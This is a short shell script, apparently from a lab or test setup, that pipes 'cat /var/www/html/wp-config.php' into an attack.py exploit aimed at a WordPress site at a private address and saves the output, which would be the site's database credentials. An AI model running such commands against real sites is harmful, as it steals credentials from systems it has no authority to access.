#!/bin/sh

CONFIG_OUT_FILE="/usr/share/capture/wp_config.txt"

touch "${CONFIG_OUT_FILE}"

echo 'cat /var/www/html/wp-config.php' | python3 /usr/share/scripts/attack.py --u http://172.18.0.2 -p /?p=1 > $CONFIG_OUT_FILE
